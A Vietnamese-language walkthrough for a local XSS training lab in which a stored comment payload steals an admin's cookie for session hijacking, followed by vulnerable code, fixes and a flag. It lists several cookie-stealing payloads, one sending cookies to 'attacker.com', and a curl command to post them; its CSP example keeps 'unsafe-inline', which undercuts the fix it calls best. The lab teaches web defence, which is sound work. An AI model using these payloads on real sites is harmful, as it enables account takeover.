# 🎯 XSS (Cross-Site Scripting) Lab

Hướng dẫn chi tiết về XSS Lab - khai thác lỗ hổng Cross-Site Scripting và Session Hijacking.

## 📍 Truy Cập Lab

XSS Lab được tích hợp trong Authentication Bypass Lab:

```
http://localhost:3000/lab/auth
```

## 🎯 Mục Tiêu

1. **Đăng nhập** với tài khoản user
2. **Post comment** với XSS payload
3. **Trigger XSS** khi admin xem comment
4. **Đánh cắp cookie** của admin
5. **Session hijacking** để đăng nhập admin

## 🌟 Tính Năng Đặc Biệt: Chrome Auto-Login

Security Lab có tính năng **Chrome Auto-Login** - tự động mở Chrome browser và đăng nhập admin khi phát hiện XSS payload!

### Workflow Tự Động

```
1. User post comment với XSS payload
2. Server phát hiện XSS patterns
3. ⏰ Đợi 3 giây
4. 🌐 Tự động mở Chrome browser
5. 🔐 Đăng nhập admin (admin/admin123)
6. 👀 Xem comments page
7. 🎯 XSS payload thực sự execute
8. 🚨 Cookie bị đánh cắp
9. 📸 Chụp screenshot
10. 🔒 Đóng browser sau 5 giây
```

## 🧪 Các Bước Thực Hành

### Bước 1: Đăng Nhập User

```
Username: user1
Password: password1
```

### Bước 2: Post XSS Payload

Trong comment box, nhập:

```html
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
```

### Bước 3: Xem Magic! ✨

**Server Console sẽ hiển thị**:

```
🚀 [CHROME-AUTO] Phát hiện comment mới, chuẩn bị mở Chrome...
🎯 [CHROME-AUTO] XSS payload detected! Sẽ mở Chrome sau 3 giây...
🌐 [CHROME-AUTO] Đang mở Chrome browser...
🚀 [CHROME-AUTO] Đang khởi động Chrome browser...
✅ [CHROME-AUTO] Chrome browser đã sẵn sàng
🔐 [CHROME-AUTO] Đang đăng nhập admin...
✅ [CHROME-AUTO] Admin đã đăng nhập thành công
👀 [CHROME-AUTO] Admin đang xem comments...
🎯 [CHROME-AUTO] XSS payload đã được trigger (nếu có)
✅ [CHROME-AUTO] Chrome automation hoàn thành!
📸 [CHROME-AUTO] Screenshot saved: xss-attack-1697451234567.png
🔒 [CHROME-AUTO] Browser đã đóng
```

**Browser sẽ**:

1. ✅ Tự động mở Chrome
2. ✅ Navigate đến `/lab/auth`
3. ✅ Điền username: `admin`, password: `admin123`
4. ✅ Click đăng nhập
5. ✅ Xem comments page
6. ✅ XSS payload execute thật
7. ✅ Cookie bị gửi đến `/api/steal`
8. ✅ Screenshot được lưu
9. ✅ Browser tự đóng sau 5 giây

### Bước 4: Xem Stolen Cookie

Check console của server hoặc xem trong bảng comments (entry `[HACKER-LOG]`):

```
🚨 STOLEN COOKIE RECEIVED:
Timestamp: 2025-10-16T...
Cookie: auth=admin:admin123
IP: ::1
User-Agent: Mozilla/5.0...
```

## 🔍 XSS Detection Patterns

Server sẽ phát hiện XSS payload khi comment chứa:

-   `<script` → Script injection
-   `<img` → Image-based XSS
-   `<svg` → SVG-based XSS
-   `onerror` → Event handler XSS
-   `javascript:` → JavaScript protocol

## 🧪 Các XSS Payloads Test

### 1. Basic XSS

```html
<script>
    alert("XSS");
</script>
```

### 2. Cookie Stealing

```html
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
```

### 3. Image-based XSS

```html
<img src="x" onerror="fetch('/api/steal?cookie='+document.cookie)" />
```

### 4. SVG XSS

```html
<svg onload="fetch('/api/steal?cookie='+document.cookie)"></svg>
```

### 5. Obfuscated XSS

```html
<script>
    var img = new Image();
    img.src = "http://localhost:3000/api/steal?cookie=" + document.cookie;
</script>
```

### 6. External Server (Real Attack)

```html
<script>
    document.location = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

## 🔍 Phân Tích Kỹ Thuật

### Code Vulnerable

```javascript
// src/controllers/CommentController.js - KHÔNG AN TOÀN
const { comment } = req.body;

// Lưu comment trực tiếp vào database
await Comment.create(username, comment);

// Render comment trong HTML mà không escape
// <%- comment %> trong EJS template
```

### Tại Sao Có Lỗ Hổng?

1. **No Input Validation**: Không validate XSS patterns
2. **No Output Encoding**: Không escape HTML entities
3. **Direct Database Storage**: Lưu trực tiếp vào database
4. **Unsafe Rendering**: Render raw HTML trong template

### Cách Khai Thác

**Input**: `<script>fetch("/api/steal?cookie=" + document.cookie);</script>`

**Database**: Lưu raw HTML
**Template**: `<%- comment %>` → Render raw HTML
**Browser**: JavaScript execute → Cookie bị đánh cắp

## 🛡️ Cách Phòng Chống

### ❌ KHÔNG AN TOÀN

```javascript
// Lưu raw HTML vào database
await Comment.create(username, comment);

// Render raw HTML
<%- comment %>
```

### ✅ AN TOÀN - Input Validation

```javascript
// Validate và sanitize input
const xss = require("xss");

const cleanComment = xss(comment, {
    whiteList: {}, // Không cho phép HTML tags
    stripIgnoreTag: true,
    stripIgnoreTagBody: ["script"],
});

await Comment.create(username, cleanComment);
```

### ✅ TỐT HƠN - Output Encoding

```javascript
// Escape HTML entities khi render
<%= comment %>
// Thay vì
<%- comment %>
```

### ✅ TỐT NHẤT - Content Security Policy

```javascript
// Set CSP header
app.use((req, res, next) => {
    res.setHeader(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self' 'unsafe-inline'"
    );
    next();
});
```

## 🎓 Bài Tập Thực Hành

### Level 1: Basic XSS

1. Post comment với `<script>alert("XSS")</script>`
2. Xem Chrome auto-login hoạt động
3. Check stolen cookie trong console

### Level 2: Cookie Stealing

1. Post comment với cookie stealer payload
2. Xem cookie admin bị đánh cắp
3. Sử dụng cookie để đăng nhập admin

### Level 3: Advanced Techniques

1. Thử các payload obfuscated
2. Test với external server
3. Kết hợp với authentication bypass

## ⚠️ Tác Động Trong Thực Tế

### 1. Session Hijacking

```
1. Attacker post XSS payload
2. Victim xem comment
3. JavaScript execute trên browser victim
4. Cookie bị đánh cắp
5. Attacker dùng cookie để đăng nhập
```

### 2. Account Takeover

```
1. XSS trong profile/comment
2. Mọi user xem → Cookie bị đánh cắp
3. Attacker có database session tokens
4. Mass account takeover
```

### 3. Data Theft

```
1. XSS trong admin panel
2. Admin xem → Sensitive data bị đánh cắp
3. Database credentials, API keys
```

### 4. Malware Distribution

```
1. XSS trong trang public
2. Redirect user đến malicious site
3. Download malware
4. Keylogger, ransomware
```

## 🔧 Debugging Tips

### Xem Chrome Automation

-   Browser sẽ mở và thực hiện automation
-   Screenshot được lưu với tên `xss-attack-{timestamp}.png`
-   Console logs chi tiết từng bước

### Test với curl

```bash
# Post XSS comment
curl -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d '{"comment":"<script>fetch(\"/api/steal?cookie=\"+document.cookie)</script>"}'
```

### Browser DevTools

-   Network tab để xem requests
-   Console để debug JavaScript
-   Application tab để xem cookies

## 🚩 FLAG

```
FLAG{4uth_Byp4ss_C00k13_H4ck}
```

## 📚 Tài Liệu Tham Khảo

-   [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-   [XSS Filter Evasion](https://owasp.org/www-community/attacks/XSS_Filter_Evasion_Cheat_Sheet)
-   [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

**Độ khó**: Trung bình - Nâng cao  
**Thời gian**: 20-40 phút  
**Yêu cầu**: Kiến thức về XSS và browser security
